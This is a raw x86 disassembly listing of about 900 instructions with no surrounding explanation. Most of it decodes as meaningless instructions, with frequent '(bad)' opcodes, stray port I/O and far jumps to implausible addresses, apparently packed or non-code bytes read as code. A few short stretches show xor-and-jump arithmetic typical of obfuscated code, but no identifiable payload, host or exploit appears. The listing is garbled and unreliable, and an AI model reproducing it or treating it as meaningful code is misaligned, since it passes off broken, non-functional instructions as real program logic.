  40fd49:	pop    edi
  40fd4a:	pop    esi
  40fd4b:	pop    es
  40fd4c:	bound  esi,QWORD PTR [ebx+0x14f442e2]
  40fd52:	outs   dx,BYTE PTR ds:[esi]
  40fd53:	mov    eax,ds:0xca7ba18
  40fd58:	(bad)  
  40fd59:	loope  0x40fd8d
  40fd5b:	dec    ebx
  40fd5c:	push   ecx
  40fd5d:	(bad)  
  40fd60:	lock into 
  40fd62:	ins    BYTE PTR es:[edi],dx
  40fd63:	cmp    al,0x8e
  40fd65:	xchg   dh,dl
  40fd67:	mov    ebp,0x4a56302f
  40fd6c:	ins    BYTE PTR es:[edi],dx
  40fd6d:	cld    
  40fd6e:	mov    ch,0x6f
  40fd70:	jae    0x40fd5b
  40fd72:	sbb    bh,al
  40fd74:	sub    BYTE PTR [eax+0x3258b057],cl
  40fd7a:	sub    al,0x38
  40fd7c:	mov    al,ds:0xbe876256
  40fd81:	jo     0x40fd20
  40fd83:	(bad)  
  40fd84:	jmp    FWORD PTR [ebx]
  40fd86:	cli    
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	int3   
  40fdbc:	test   DWORD PTR [ebx],eax
  40fdbe:	stc    
  40fdbf:	jp     0x40fe0c
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	fldcw  WORD PTR cs:[eax]
  40fdca:	sbb    DWORD PTR [esi+esi*8],0xb2521bda
  40fdd1:	fldcw  WORD PTR [esi-0x6f]
  40fdd4:	sbb    BYTE PTR [ebx],dh
  40fdd6:	je     0x40fe1e
  40fdd8:	dec    edi
  40fdd9:	xchg   ebp,eax
  40fdda:	mov    al,0xf
  40fddc:	mov    dh,0xd0
  40fdde:	mov    ah,0x18
  40fde0:	mov    ds:0x832fd8a3,al
  40fde5:	push   ecx
  40fde6:	out    dx,al
  40fde7:	mov    BYTE PTR [esi-0x7dce076d],dh
  40fded:	mov    dl,0x4f
  40fdef:	retf   
  40fdf0:	and    ecx,DWORD PTR [ebx-0x7]
  40fdf3:	aaa    
  40fdf4:	rcl    ah,cl
  40fdf6:	ret    0xac1a
  40fdf9:	aam    0xbd
  40fdfb:	pop    ebp
  40fdfc:	sbb    DWORD PTR [edi-0x48],esp
  40fdff:	add    esi,DWORD PTR [ebx]
  40fe01:	inc    esp
  40fe02:	xchg   DWORD PTR [edi+0x7c],edx
  40fe05:	push   ds
  40fe06:	jae    0x40fd9f
  40fe08:	mov    esp,0xab910657
  40fe0d:	in     eax,0xf1
  40fe0f:	gs pop eax
  40fe11:	inc    edi
  40fe12:	pop    edi
  40fe13:	xlat   BYTE PTR ds:[ebx]
  40fe14:	dec    BYTE PTR [eax+0x19]
  40fe17:	dec    esp
  40fe18:	xchg   edx,eax
  40fe19:	add    ch,BYTE PTR [ecx+0x413ff5d5]
  40fe1f:	dec    BYTE PTR [edx]
  40fe21:	push   ss
  40fe22:	ins    BYTE PTR es:[edi],dx
  40fe23:	fisub  DWORD PTR [edx]
  40fe25:	in     al,dx
  40fe26:	out    dx,eax
  40fe27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe28:	mov    ah,0xd5
  40fe2a:	mov    cl,0x24
  40fe2c:	xor    eax,0xffffffa7
  40fe2f:	adc    DWORD PTR [ecx-0x18],esp
  40fe32:	or     al,0x38
  40fe34:	rcr    edx,cl
  40fe36:	xchg   BYTE PTR [ebp-0x6f],ah
  40fe39:	push   ds
  40fe3a:	mov    BYTE PTR [eax-0x7645227f],ch
  40fe40:	xlat   BYTE PTR ds:[ebx]
  40fe41:	stos   BYTE PTR es:[edi],al
  40fe42:	loop   0x40fdd1
  40fe44:	and    BYTE PTR [ebx+0x3caf1fc7],ch
  40fe4a:	dec    ebp
  40fe4b:	std    
  40fe4c:	neg    DWORD PTR [esi]
  40fe4e:	sub    edi,DWORD PTR [edx+eax*1+0x4448e9ec]
  40fe55:	mov    eax,0x788191f4
  40fe5a:	sbb    edi,0xe014662a
  40fe60:	test   eax,0x8affc3ad
  40fe65:	sub    edi,esi
  40fe67:	push   es
  40fe68:	and    eax,0x4d549965
  40fe6d:	adc    eax,DWORD PTR [edi+0x4c778d2f]
  40fe73:	jmp    0x40fdf5
  40fe75:	pusha  
  40fe76:	jb     0x40fee1
  40fe78:	mov    ds:0x37481345,al
  40fe7d:	push   edx
  40fe7e:	dec    edi
  40fe7f:	cli    
  40fe80:	mov    ch,0xea
  40fe82:	mov    dh,0xe6
  40fe84:	dec    eax
  40fe85:	xor    ah,ch
  40fe87:	out    dx,eax
  40fe88:	push   ds
  40fe89:	ret    0x40d7
  40fe8c:	mov    BYTE PTR [edx],bh
  40fe8e:	aam    0xb6
  40fe90:	dec    ebp
  40fe91:	and    dh,0x5a
  40fe94:	lea    ebx,[edx+ebp*1]
  40fe97:	mov    eax,ds:0x3f7ce318
  40fe9c:	xlat   BYTE PTR ds:[ebx]
  40fe9d:	and    cl,bh
  40fe9f:	dec    eax
  40fea0:	jge    0x40ff0a
  40fea2:	(bad)  
  40fea3:	sahf   
  40fea4:	sub    dl,BYTE PTR [ebx]
  40fea6:	aad    0xcb
  40fea8:	call   0x6926:0x96c458ab
  40feaf:	adc    cl,BYTE PTR [ecx-0x4205f3cd]
  40feb5:	push   cs
  40feb6:	mov    WORD PTR [ebp-0x72],gs
  40feb9:	mov    edx,0xd1987693
  40febe:	xor    ecx,ebp
  40fec0:	inc    ecx
  40fec1:	cld    
  40fec2:	ja     0x40fec1
  40fec4:	div    BYTE PTR [edi+0x10fedd91]
  40feca:	push   ebx
  40fecb:	dec    ecx
  40fecc:	paddw  mm6,QWORD PTR [ecx+0x7b554c14]
  40fed3:	sbb    ch,dh
  40fed5:	jp     0x40fe9a
  40fed7:	icebp  
  40fed8:	std    
  40fed9:	dec    edx
  40feda:	and    ch,BYTE PTR [ebp+0x3d3167c3]
  40fee0:	ins    BYTE PTR es:[edi],dx
  40fee1:	xchg   esi,eax
  40fee2:	push   cs
  40fee3:	test   al,0xba
  40fee5:	xchg   ecx,eax
  40fee6:	mov    ah,0x1f
  40fee8:	adc    ebx,edi
  40feea:	fsubr  QWORD PTR [edi+ecx*8]
  40feed:	jg     0x40ff2b
  40feef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fef0:	call   0x25bb331d
  40fef5:	pop    edx
  40fef6:	push   ebp
  40fef7:	jmp    0xd7f1:0x49b33f91
  40fefe:	cmp    dh,BYTE PTR [ecx]
  40ff00:	setbe  BYTE PTR [ebx]
  40ff03:	jo     0x40ff0e
  40ff05:	and    esi,DWORD PTR [eax]
  40ff07:	cwde   
  40ff08:	adc    eax,0x38e085cc
  40ff0d:	cmp    eax,0x96cc80b3
  40ff12:	push   es
  40ff13:	in     eax,dx
  40ff14:	pop    edx
  40ff15:	outs   dx,BYTE PTR fs:[esi]
  40ff17:	lock jnp 0x40fec0
  40ff1a:	imul   ebx,DWORD PTR [ecx],0x3e3307c7
  40ff20:	loope  0x40ff87
  40ff22:	into   
  40ff23:	fst    QWORD PTR [esi+0x3c]
  40ff26:	cmp    ch,BYTE PTR [esi]
  40ff28:	and    eax,0xf5c11c27
  40ff2d:	push   esp
  40ff2e:	enter  0x90e5,0x4a
  40ff32:	dec    eax
  40ff33:	outs   dx,DWORD PTR ds:[esi]
  40ff34:	fcom   DWORD PTR [esi+0x61]
  40ff37:	stos   DWORD PTR es:[edi],eax
  40ff38:	xor    BYTE PTR [ebp+0x49687b37],dh
  40ff3e:	les    ebx,FWORD PTR [edi-0x4b]
  40ff41:	scas   eax,DWORD PTR es:[edi]
  40ff42:	outs   dx,DWORD PTR ds:[esi]
  40ff43:	mov    DWORD PTR ds:0x610e0820,ecx
  40ff49:	dec    esp
  40ff4a:	(bad)  
  40ff4b:	sub    al,0xba
  40ff4d:	icebp  
  40ff4e:	push   edi
  40ff4f:	cmp    al,0x90
  40ff51:	lds    esp,FWORD PTR [edi]
  40ff53:	pop    ebx
  40ff54:	pop    esi
  40ff55:	and    ah,bh
  40ff57:	fcom   DWORD PTR [edi+eiz*1+0x55]
  40ff5b:	fsubr  QWORD PTR [ebp-0x28]
  40ff5e:	adc    bh,BYTE PTR [ebx]
  40ff60:	jne    0x40ffa7
  40ff62:	mov    esp,0x42a604ff
  40ff67:	aaa    
  40ff68:	mov    al,0x67
  40ff6a:	pop    ecx
  40ff6b:	fs ins BYTE PTR es:[edi],dx
  40ff6d:	outs   dx,BYTE PTR ds:[esi]
  40ff6e:	scas   eax,DWORD PTR es:[edi]
  40ff6f:	dec    edx
  40ff70:	clc    
  40ff71:	aam    0x3c
  40ff73:	pop    ebp
  40ff74:	loope  0x40ff95
  40ff76:	or     DWORD PTR [edx+ecx*1+0x2c],edx
  40ff7a:	cdq    
  40ff7b:	push   0xd61c283e
  40ff80:	push   ebx
  40ff81:	sub    BYTE PTR [esi],dl
  40ff83:	fistp  DWORD PTR ds:0x8074f2d
  40ff89:	mov    dh,0x92
  40ff8b:	hlt    
  40ff8c:	sub    BYTE PTR [ecx+0x6b498e99],ah
  40ff92:	xor    DWORD PTR [ecx+0x43a13764],0xffffff9f
  40ff99:	loop   0x40ff63
  40ff9b:	dec    edx
  40ff9c:	stos   DWORD PTR es:[edi],eax
  40ff9d:	and    dh,bh
  40ff9f:	sbb    eax,0xf3c0b6d7
  40ffa4:	in     al,dx
  40ffa5:	addr16 das 
  40ffa7:	push   0x25
  40ffa9:	bound  edx,QWORD PTR [edi+edx*8+0x47]
  40ffad:	jecxz  0x40ff3b
  40ffaf:	pop    ebp
  40ffb0:	pop    esp
  40ffb1:	sbb    BYTE PTR [edi],dh
  40ffb3:	mov    gs,ebx
  40ffb5:	std    
  40ffb6:	jnp    0x40ff3a
  40ffb8:	cmp    edx,DWORD PTR [edx-0x20]
  40ffbb:	xor    al,0x27
  40ffbd:	push   eax
  40ffbe:	mov    dl,0xd2
  40ffc0:	push   ss
  40ffc1:	or     al,0x70
  40ffc3:	add    ah,BYTE PTR [edi-0x651cc37]
  40ffc9:	(bad)  
  40ffcb:	jb     0x40ff66
  40ffcd:	hlt    
  40ffce:	stos   BYTE PTR es:[edi],al
  40ffcf:	adc    bl,BYTE PTR [edi+0x13]
  40ffd2:	inc    edx
  40ffd3:	or     al,0xe7
  40ffd5:	aaa    
  40ffd6:	ja     0x40ffe6
  40ffd8:	ins    BYTE PTR es:[edi],dx
  40ffd9:	popf   
  40ffda:	in     al,dx
  40ffdb:	push   ds
  40ffdc:	fild   DWORD PTR [esi+edx*2+0x56aa9485]
  40ffe3:	push   0xfffffff2
  40ffe5:	adc    DWORD PTR [esi-0x7],ecx
  40ffe8:	scas   eax,DWORD PTR es:[edi]
  40ffe9:	dec    edx
  40ffea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffeb:	push   es
  40ffec:	cmp    al,0xc2
  40ffee:	cmp    al,cl
  40fff0:	aam    0xd5
  40fff2:	pop    ebp
  40fff3:	push   ds
  40fff4:	jp     0x40fffc
  40fff6:	hlt    
  40fff7:	pop    esi
  40fff8:	xchg   DWORD PTR [esi+0x7e],esp
  40fffb:	stos   DWORD PTR es:[edi],eax
  40fffc:	add    ah,BYTE PTR [edi+0x66]
  40ffff:	aam    0x9c
  410001:	(bad)  
  410002:	mov    ds:0x7d92c566,eax
  410007:	jno    0x40ffee
  410009:	(bad)  
  41000a:	fild   QWORD PTR [esi]
  41000c:	lock push es
  41000e:	sti    
  41000f:	add    al,0xdc
  410011:	fwait
  410012:	call   FWORD PTR [eax]
  410014:	outs   dx,DWORD PTR ds:[esi]
  410015:	and    DWORD PTR [edi+0x7],esp
  410018:	adc    eax,0x4f5f18e5
  41001d:	inc    esi
  41001e:	ror    DWORD PTR [edi+0x2a],cl
  410021:	push   cs
  410022:	dec    BYTE PTR [edx+0x418db515]
  410028:	sbb    al,0x32
  41002a:	fadd   QWORD PTR [ebx+0x6955b81f]
  410030:	mov    cl,0x8a
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	loopne 0x410055
  41006a:	lea    edi,[edi+eiz*8-0x1a8787b8]
  410071:	jle    0x4100eb
  410073:	js     0x410054
  410075:	imul   ebx,DWORD PTR [edx],0x50
  410078:	sub    al,0xaf
  41007a:	or     al,0xe4
  41007c:	popa   
  41007d:	and    BYTE PTR [ebx],al
  41007f:	mov    eax,0xaf46c5c4
  410084:	and    eax,0xa5163c0c
  410089:	jmp    0x41006d
  41008b:	or     eax,0x1f748ff7
  410090:	int    0xd8
  410092:	jnp    0x4100c0
  410094:	dec    ecx
  410095:	adc    ch,ah
  410097:	sub    DWORD PTR [edx+edi*4+0x45d5827e],edi
  41009e:	inc    ebp
  41009f:	gs nop
  4100a1:	(bad)
  4100a5:	add    al,0x8d
  4100a7:	out    0xb0,eax
  4100a9:	inc    ecx
  4100aa:	ret    0x5338
  4100ad:	pop    esi
  4100ae:	inc    esi
  4100af:	out    0x65,al
  4100b1:	stos   DWORD PTR es:[edi],eax
  4100b2:	push   DWORD PTR [edx]
  4100b4:	push   ebp
  4100b5:	or     cl,BYTE PTR [eax-0x7e]
  4100b8:	sub    al,0xa9
  4100ba:	and    ebx,DWORD PTR [ebp+0x5e]
  4100bd:	retf   0x2bd1
  4100c0:	sahf   
  4100c1:	xchg   edx,eax
  4100c2:	lods   al,BYTE PTR ds:[esi]
  4100c3:	sub    DWORD PTR [eax+0xb],ebx
  4100c6:	add    eax,DWORD PTR [esi-0x1]
  4100c9:	xchg   BYTE PTR [ebx+0x1943e7fc],bh
  4100cf:	inc    ebp
  4100d0:	mov    edi,DWORD PTR [edx]
  4100d2:	push   edx
  4100d3:	dec    edx
  4100d4:	xchg   ecx,eax
  4100d5:	or     BYTE PTR [edi-0x32],al
  4100d8:	push   cs
  4100d9:	jnp    0x41009f
  4100db:	mul    BYTE PTR [edi-0x10]
  4100de:	inc    edi
  4100df:	adc    al,0xe
  4100e1:	sahf   
  4100e2:	fmul   DWORD PTR [edx-0x377a5401]
  4100e8:	icebp  
  4100e9:	add    esp,edi
  4100eb:	call   eax
  4100ed:	(bad)  
  4100ee:	mov    ecx,0x9e3dab20
  4100f3:	add    bl,BYTE PTR [ebp+edx*8+0x44]
  4100f7:	clc    
  4100f8:	retf   0xb2
  4100fb:	mov    eax,ds:0x448369db
  410100:	xchg   ebp,eax
  410101:	sbb    dh,bl
  410103:	mov    ?,WORD PTR [edi+0x6187f999]
  410109:	cmp    BYTE PTR [edi],bh
  41010b:	pusha  
  41010c:	and    bh,BYTE PTR [ebx+0x64d19ab8]
  410112:	add    dl,bh
  410114:	and    DWORD PTR [ecx-0x764ae2e6],edx
  41011a:	inc    edi
  41011b:	inc    esi
  41011c:	daa    
  41011d:	push   ebp
  41011e:	sbb    esi,DWORD PTR [esi+0x3cc1528b]
  410124:	sbb    BYTE PTR [esp+esi*2],ah
  410127:	inc    ecx
  410128:	mul    ebp
  41012a:	das    
  41012b:	mov    WORD PTR ss:[eax],fs
  41012e:	jmp    0x4100c4
  410130:	loop   0x4100b3
  410132:	scas   al,BYTE PTR es:[edi]
  410133:	das    
  410134:	and    DWORD PTR [edi],edx
  410136:	xchg   edx,eax
  410137:	jns    0x41016b
  410139:	repz (bad) 
  41013b:	bound  edx,QWORD PTR [ebx-0x20c40031]
  410141:	test   al,bh
  410143:	and    eax,0xa4581ad0
  410148:	ret    0xa4dc
  41014b:	jns    0x410144
  41014d:	push   0x51
  41014f:	xchg   BYTE PTR [ebp+edx*8-0xcb90094],dl
  410156:	sbb    esi,DWORD PTR [eax+0x15]
  410159:	mov    ch,0xd9
  41015b:	fucomp st(2)
  41015d:	jno    0x4101ca
  41015f:	sbb    esi,esp
  410161:	ss pop eax
  410163:	mov    esp,0x3d3a11a1
  410168:	xchg   DWORD PTR [edi+0x52],ebx
  41016b:	sbb    al,0xb0
  41016d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41016e:	test   al,0x59
  410170:	mov    DWORD PTR [esi],eax
  410172:	jb     0x4101dc
  410174:	mov    al,0x2a
  410176:	test   BYTE PTR [edi+esi*2+0x1b],al
  41017a:	pop    eax
  41017b:	fisttp DWORD PTR [ebx+0x430fe7c]
  410181:	cmp    bh,BYTE PTR [esp+ecx*8-0x51]
  410185:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  410187:	pushf  
  410188:	int3   
  410189:	call   0x62142b8c
  41018e:	cdq    
  41018f:	loope  0x41012c
  410191:	stos   DWORD PTR es:[edi],eax
  410192:	(bad)  
  410193:	cmp    DWORD PTR [esi+0x9f45176],ecx
  410199:	outs   dx,BYTE PTR ds:[esi]
  41019a:	nop
  41019b:	rol    eax,1
  41019d:	sbb    esi,DWORD PTR [eax-0x2fa050f1]
  4101a3:	ret    0x52f2
  4101a6:	mov    BYTE PTR [esi-0x4f],dl
  4101a9:	push   ds
  4101aa:	sbb    BYTE PTR [edx+0x34],bh
  4101ad:	dec    eax
  4101ae:	sub    dl,bl
  4101b0:	xchg   esi,eax
  4101b1:	pop    ss
  4101b2:	add    DWORD PTR [ecx+esi*1+0x18d78fbd],edx
  4101b9:	pushf  
  4101ba:	mov    cs,WORD PTR [eax+0x77]
  4101bd:	dec    esi
  4101be:	xor    DWORD PTR [edx+eax*2],0x187c9ebf
  4101c5:	xor    DWORD PTR [edx-0x1a],ecx
  4101c8:	mov    esi,0x29bc443b
  4101cd:	dec    eax
  4101ce:	idiv   DWORD PTR [eax+esi*2+0x52]
  4101d2:	call   0x7edba0bd
  4101d7:	aaa    
  4101d8:	ficomp DWORD PTR [esi]
  4101da:	jle    0x41022f
  4101dc:	jecxz  0x410234
  4101de:	jo     0x410219
  4101e0:	mov    bh,0x49
  4101e2:	or     edx,DWORD PTR [ecx-0x56]
  4101e5:	or     ecx,edx
  4101e7:	ror    al,1
  4101e9:	mov    al,0xde
  4101eb:	aaa    
  4101ec:	outs   dx,DWORD PTR ds:[esi]
  4101ed:	pushw  0xffba
  4101f0:	es loopne 0x410250
  4101f3:	or     eax,0x17547508
  4101f8:	mov    ds:0x3580e024,al
  4101fd:	push   esi
  4101fe:	xlat   BYTE PTR ds:[ebx]
  4101ff:	adc    DWORD PTR ds:0x1480f1b6,ecx
  410205:	xor    al,0x1c
  410207:	push   ds
  410208:	test   al,0x31
  41020a:	xchg   esp,eax
  41020b:	loop   0x410242
  41020d:	repz jno 0x41027f
  410210:	and    eax,0x6c0267ec
  410215:	pusha  
  410216:	cwde   
  410217:	and    ebx,DWORD PTR [edi]
  410219:	stos   DWORD PTR es:[edi],eax
  41021a:	jmp    0x41020c
  41021c:	lock and BYTE PTR [esi+0x7fe6d555],0x4e
  410224:	rcr    DWORD PTR [esi],cl
  410226:	popf   
  410227:	inc    eax
  410228:	push   esp
  410229:	sub    al,0xce
  41022b:	and    ch,BYTE PTR [ebx+0x56dd0435]
  410231:	(bad)  
  410232:	loop   0x4102a8
  410234:	push   esi
  410235:	push   ds
  410236:	stos   BYTE PTR es:[edi],al
  410237:	in     eax,dx
  410238:	ret    0x34f7
  41023b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41023c:	mov    ss,WORD PTR [ebx+eax*4+0x7805380b]
  410243:	or     al,0xe4
  410245:	cwde   
  410246:	int3   
  410247:	pop    esi
  410248:	loope  0x410259
  41024a:	data16 ins BYTE PTR es:[edi],dx
  41024c:	push   es
  41024d:	push   ecx
  41024e:	in     al,dx
  41024f:	(bad)
  410253:	sub    BYTE PTR [ebp-0x2d9c2677],bl
  410259:	and    al,0xa7
  41025b:	out    dx,eax
  41025c:	inc    esp
  41025d:	sub    BYTE PTR [esi+0x52b6d4a6],bh
  410263:	inc    ebx
  410264:	mov    dh,BYTE PTR [esi]
  410266:	ja     0x410244
  410268:	and    dl,BYTE PTR [ecx+edx*1]
  41026b:	imul   esi,DWORD PTR [ebx],0x1f094d73
  410271:	mov    BYTE PTR [edi+0x7fa2d154],al
  410277:	mov    ebp,0xfd96ac08
  41027c:	jb     0x410231
  41027e:	cmp    ebx,edx
  410280:	ss jmp 0x4102f6
  410283:	sub    bh,bl
  410285:	jge    0x4102d7
  410287:	xor    eax,0x8b18a6b7
  41028c:	or     eax,0x7c260189
  410291:	repz mov cl,0x57
  410294:	out    dx,al
  410295:	xchg   ebx,eax
  410296:	mov    al,ah
  410298:	jmp    0x41029d
  41029a:	xor    bh,dl
  41029c:	lahf   
  41029d:	jb     0x410270
  41029f:	sbb    al,0x72
  4102a1:	mov    cl,0xab
  4102a3:	jnp    0x4102a5
  4102a5:	loope  0x4102b8
  4102a7:	imul   esi,DWORD PTR [edx+0x61bbd27b],0xb3287c27
  4102b1:	enter  0x68c8,0x3e
  4102b5:	outs   dx,DWORD PTR ds:[esi]
  4102b6:	cmp    al,0x8e
  4102b8:	fisubr WORD PTR [eax]
  4102ba:	sub    al,0xe6
  4102bc:	xchg   ebx,eax
  4102bd:	int3   
  4102be:	or     DWORD PTR [ebx+0x58],edi
  4102c1:	sub    eax,0x5ef8d706
  4102c6:	jl     0x41031f
  4102c8:	mov    ch,0x65
  4102ca:	ror    BYTE PTR [ebx+ebx*4+0x4a51de50],cl
  4102d1:	add    al,0xf8
  4102d3:	aas    
  4102d4:	and    edx,ecx
  4102d6:	push   esp
  4102d7:	nop
  4102d8:	push   0xaa1be148
  4102dd:	sub    al,0x5
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	xchg   edi,eax
  4102f3:	xor    bh,ch
  4102f5:	jp     0x410343
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	mov    dh,0x17
  410300:	xchg   DWORD PTR [ebx-0x27],esi
  410303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410304:	jns    0x410292
  410306:	xchg   ebp,eax
  410307:	shr    BYTE PTR [ecx],0x8e
  41030a:	fcomp  st(4)
  41030c:	lods   eax,DWORD PTR ds:[esi]
  41030d:	cld    
  41030e:	inc    esp
  41030f:	pop    ecx
  410310:	sti    
  410311:	fcom   QWORD PTR [ecx-0x2c177021]
  410317:	pop    ebp
  410318:	sub    dh,0x1f
  41031b:	mov    dl,0x25
  41031d:	inc    ebp
  41031e:	xor    al,0x68
  410320:	jns    0x410309
  410322:	mov    bl,0x30
  410324:	jb     0x410392
  410326:	or     bh,BYTE PTR [ebp-0x1e1170f1]
  41032c:	in     al,0x8d
  41032e:	icebp  
  41032f:	mov    edi,0x81607b08
  410334:	and    cl,ch
  410336:	xchg   ecx,eax
  410337:	inc    esp
  410338:	not    BYTE PTR ds:0x345e294d
  41033e:	fild   WORD PTR [esi+0x272eeb41]
  410344:	cmp    eax,0xffffff92
  410347:	sti    
  410348:	iret   
  410349:	in     eax,dx
  41034a:	(bad)  
  41034b:	lock mov cl,0x1a
  41034e:	jae    0x41031d
  410350:	ret    
  410351:	ja     0x410376
  410353:	mov    ebp,gs
  410355:	adc    DWORD PTR [ebx+0x3c],ebp
  410358:	ins    DWORD PTR es:[edi],dx
  410359:	iret   
  41035a:	jns    0x410382
  41035c:	lods   eax,DWORD PTR ds:[esi]
  41035d:	retf   
  41035e:	pop    ebp
  41035f:	shl    DWORD PTR [eax+0x506460b3],1
  410365:	or     eax,edx
  410367:	aas    
  410368:	loope  0x410354
  41036a:	pushf  
  41036b:	out    0x9,al
  41036d:	push   es
  41036e:	cmp    ebx,edi
  410370:	pop    ss
  410371:	xor    eax,0xb9a83651
  410376:	jmp    0x9a2234ef
  41037b:	adc    eax,0xcbab5152
  410380:	(bad)  
  410381:	push   0x673837a0
  410386:	fsubr  st(2),st
  410388:	xor    BYTE PTR [edx+edx*2-0x9],bh
  41038c:	call   0xb561aa32
  410391:	call   0x5b47ab56
  410396:	adc    ch,BYTE PTR [edi]
  410398:	mov    eax,ds:0xaba867c5
  41039d:	popf   
  41039e:	sub    esp,ebp
  4103a0:	xlat   BYTE PTR ds:[ebx]
  4103a1:	mov    cl,0x50
  4103a3:	data16 hlt 
  4103a5:	cmc    
  4103a6:	push   cs
  4103a7:	fistp  DWORD PTR [ebx+edi*8]
  4103aa:	ret    
  4103ab:	sti    
  4103ac:	mul    BYTE PTR [esi-0x53]
  4103af:	sub    BYTE PTR [edi+0x22c7964d],bl
  4103b5:	sub    BYTE PTR [ebx+0x52ae0f5a],0x8a
  4103bc:	cmp    cl,BYTE PTR [ebx-0x60]
  4103bf:	(bad)  
  4103c0:	mov    eax,ds:0xd0a9ffdf
  4103c5:	(bad)
  4103c9:	aas    
  4103ca:	daa    
  4103cb:	(bad)  
  4103cd:	cdq    
  4103ce:	in     al,0x5a
  4103d0:	pop    ebp
  4103d1:	mov    edx,0x1d3cfae1
  4103d6:	stos   DWORD PTR es:[edi],eax
  4103d7:	cs test eax,0xeb82a094
  4103dd:	inc    BYTE PTR [ebx+esi*8-0x2016547]
  4103e4:	pusha  
  4103e5:	push   0xb72656bc
  4103ea:	mov    ebp,0x39efeb11
  4103ef:	mov    eax,0x661a5052
  4103f4:	jno    0x410458
  4103f6:	popa   
  4103f7:	or     al,BYTE PTR [esi]
  4103f9:	fsub   QWORD PTR [edi]
  4103fb:	outs   dx,DWORD PTR ds:[esi]
  4103fc:	jb     0x410434
  4103fe:	ror    BYTE PTR [ebx-0x5f],0x50
  410402:	popa   
  410403:	test   BYTE PTR [edx-0x18a663c6],dl
  410409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41040a:	mov    cl,0x20
  41040c:	mov    eax,0xd63d616a
  410411:	(bad)  
  410413:	adc    eax,0xfa5739ba
  410418:	mov    edx,DWORD PTR [eax]
  41041a:	inc    eax
  41041b:	dec    esp
  41041c:	mov    al,0xa7
  41041e:	cmp    DWORD PTR [ecx+esi*4],edx
  410421:	or     ah,bl
  410423:	cli    
  410424:	or     edi,DWORD PTR [edi+0x427ce839]
  41042a:	outs   dx,DWORD PTR ds:[esi]
  41042b:	retw   
  41042d:	js     0x4103e0
  41042f:	pop    ds
  410430:	popa   
  410431:	pop    esp
  410432:	jb     0x4104a4
  410434:	jmp    0x410418
  410436:	adc    DWORD PTR [edi+0x5f],ebx
  410439:	mov    al,ds:0xfd304f5e
  41043e:	and    esi,DWORD PTR [ecx+0x351d0892]
  410444:	scas   eax,DWORD PTR es:[edi]
  410445:	inc    edx
  410446:	jnp    0x410444
  410448:	pop    edx
  410449:	ret    
  41044a:	fisub  DWORD PTR [ebx-0x56cdaf7d]
  410450:	es jno 0x4104b4
  410453:	xlat   BYTE PTR ds:[ebx]
  410454:	dec    edi
  410455:	xchg   edi,eax
  410456:	es jecxz 0x41046d
  410459:	fwait
  41045a:	cmp    DWORD PTR [edi-0x118db84c],ebx
  410460:	push   0x7d
  410462:	inc    eax
  410463:	xchg   esi,eax
  410464:	cmp    al,0x93
  410466:	mov    bl,0x34
  410468:	push   ds
  410469:	lahf   
  41046a:	sar    DWORD PTR [edx],0x90
  41046d:	stos   DWORD PTR es:[edi],eax
  41046e:	cs inc esi
  410470:	cdq    
  410471:	xchg   DWORD PTR [esi+0x4f],ecx
  410474:	and    al,0x49
  410476:	push   esp
  410477:	ins    BYTE PTR es:[edi],dx
  410478:	cs push esp
  41047a:	ror    BYTE PTR [esi+0x21],1
  41047d:	call   0xe3f4c1c1
  410482:	add    eax,0x6fffc43d
  410487:	in     al,dx
  410488:	in     al,0x28
  41048a:	mov    ebp,0xc0cf8d66
  41048f:	stc    
  410490:	ret    0x8d00
  410493:	scas   eax,DWORD PTR es:[edi]
  410494:	je     0x4104e2
  410496:	xchg   edx,eax
  410497:	fidivr DWORD PTR [edx+eax*2-0x39]
  41049b:	and    bh,cl
  41049d:	pop    esp
  41049e:	and    eax,0x142f0f1d
  4104a3:	add    DWORD PTR [ebx+0x3d96e9fd],ecx
  4104a9:	pop    edi
  4104aa:	lock int 0x8b
  4104ad:	mov    ds:0x73a2df62,eax
  4104b2:	das    
  4104b3:	sbb    DWORD PTR [edx+0x62],0xe919c1fc
  4104ba:	(bad)  
  4104bb:	pop    esi
  4104bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104bd:	mov    eax,0x904c6a31
  4104c2:	mov    dl,0x5f
